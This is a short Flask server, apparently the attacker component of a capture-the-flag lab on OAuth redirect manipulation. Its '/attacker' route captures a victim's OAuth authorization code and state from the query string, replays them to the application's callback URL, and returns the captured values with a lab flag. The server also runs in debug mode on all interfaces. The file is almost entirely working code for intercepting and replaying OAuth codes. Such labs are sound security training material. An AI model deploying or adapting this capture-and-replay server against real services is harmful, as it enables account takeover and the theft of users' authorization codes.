from flask import Flask, request
import requests
import netifaces

app = Flask(__name__)

# Dynamically determine the server's IP address
def get_ip_address(interface="enp0s3"):
    try:
        # Get all addresses for the specified interface
        addresses = netifaces.ifaddresses(interface)
        # Check for IPv4 address (AF_INET)
        if netifaces.AF_INET in addresses:
            print("The IP addr for Host:",addresses[netifaces.AF_INET][0]['addr'] )
            return addresses[netifaces.AF_INET][0]['addr']
        else:
            return f"No IPv4 address found for {interface}"
    except ValueError:
        return f"Interface {interface} not found"
    except Exception as e:
        return f"Error: {str(e)}"

SERVER_IP = get_ip_address()

@app.route('/attacker')
def capture_code():
    code = request.args.get('code', '')
    state = request.args.get('state', '')
    if code:
        callback_url = f"http://{SERVER_IP}:5000/callback?code={code}&state={state}"
        response = requests.get(callback_url, allow_redirects=True)
        return f"Captured: code={code}, state={state}<br>Flag: flag{{oauth_redirect_manipulation}}<br>{response.text}"
    return "No code captured"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)